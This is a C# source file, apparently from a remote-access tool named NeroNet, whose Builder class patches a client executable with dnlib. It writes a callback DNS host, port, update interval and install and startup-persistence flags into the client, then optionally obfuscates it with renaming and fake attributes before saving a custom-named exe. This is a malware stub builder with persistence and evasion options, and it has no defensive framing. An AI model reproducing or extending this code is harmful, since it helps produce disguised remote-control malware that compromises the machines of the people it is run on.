using System;
using System.IO;
using System.Linq;
using dnlib.DotNet;
using NeroClient;

namespace NeroNet.Classes
{
    internal class Builder
    {
        //Build client
        public void BuildClient(string Port, string DNS, string Name, string UpdateInterval,
            string Install, string Startup, bool Obfuscation, bool Renaming, int RenamingTextIndex, bool FakeAttributes)
        {
                ClientSettings.DNS = DNS;
                ClientSettings.Port = Port;
                ClientSettings.UpdateInterval = UpdateInterval;
                ClientSettings.Install = Install == "True" ? "True" : "False";
                ClientSettings.Startup = Startup == "True" ? "True" : "False";           
                string FullName = "NeroClient.ClientSettings"; // Change name to NeroNetClient
                var Assembly = AssemblyDef.Load("NeroClient.exe");
                var Module = Assembly.ManifestModule;
                if (Module != null)
                {
                    var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                    if (Settings != null)
                    {
                        var Constructor = Settings.FindMethod(".cctor");
                        if (Constructor != null)
                        {
                            Constructor.Body.Instructions[0].Operand = ClientSettings.DNS;
                            Constructor.Body.Instructions[2].Operand = ClientSettings.Port;
                            Constructor.Body.Instructions[4].Operand = ClientSettings.UpdateInterval;
                            Constructor.Body.Instructions[6].Operand = ClientSettings.Install;
                            Constructor.Body.Instructions[8].Operand = ClientSettings.Startup;
                            if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                                Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");

                            if (Obfuscation)
                            {
                                Obfuscator obf = new Obfuscator();
                                if (Renaming)
                                    Assembly = obf.Rename(Assembly, RenamingTextIndex);
                                if (FakeAttributes)
                                    Assembly = obf.FakeAttributes(Assembly);
                            }
                        
                            Assembly.Write(Environment.CurrentDirectory + @"\Clients\" + Name + ".exe");
                        }
                    }
                }
        }
    }
}